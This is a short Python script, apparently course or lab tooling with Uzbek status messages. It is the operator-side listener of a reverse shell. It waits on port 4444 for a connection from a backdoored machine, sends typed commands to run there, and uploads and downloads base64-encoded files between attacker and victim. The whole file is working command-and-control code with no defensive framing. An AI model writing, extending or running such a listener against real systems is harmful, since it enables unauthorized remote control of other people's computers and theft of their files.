import base64
import socket
import json

class Listener:
    def __init__(self, ip, port):
        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        listener.bind((ip, port))
        listener.listen(0)
        print("[+] Ulanish Kutilmoqda....")
        self.connection, address = listener.accept()
        print("[+] Ulanish " + str(address) + " bilan muvaffaqiyatli amalga oshirildi ")

    def reliable_send(self, data):
        json_data = json.dumps(data)
        self.connection.send(json_data.encode())

    def reliable_receive(self):
        json_data = ""
        while True:
            try:
                json_data += self.connection.recv(1024).decode()
                return json.loads(json_data)
            except ValueError:
                continue

    def execute_remotely(self, command):
        self.reliable_send(command)
        if command == "exit":
            self.connection.close()
            exit()
        return self.reliable_receive()

    def write_file(self, path, content):
        with open(path, "wb") as file:
            file.write(base64.b64decode(content))
            return "[+] Yuklandi"

    def read_file(self, path):
        with open(path, "rb") as file:
            return base64.b64encode(file.read()).decode()

    def run(self):
        while True:
            command = input(">> ")
            try:
                if command.startswith("upload"):
                    file_content = self.read_file(command.split(" ", 1)[1])
                    command += f" {file_content}"
                result = self.execute_remotely(command)
                if command.startswith("download") and "[-] Error " not in result:
                    result = self.write_file(command.split(" ", 1)[1], result)
            except Exception:
                result = "[-] Error command"
            print(result)

my_listener = Listener("10.0.2.15", 4444)
my_listener.run()
